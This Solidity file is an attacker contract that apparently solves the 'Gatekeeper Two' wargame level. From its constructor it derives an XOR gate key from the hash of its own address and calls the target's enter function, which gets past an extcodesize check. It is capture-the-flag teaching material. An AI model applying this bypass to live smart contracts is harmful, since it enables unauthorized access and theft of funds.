pragma solidity ^0.6.0;

contract GateKeeperTwoAttacker {

    constructor(address _addr) public {
        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^uint64(0) -1);
        _addr.call(abi.encodeWithSignature('enter(bytes8)', _gateKey));
    }
}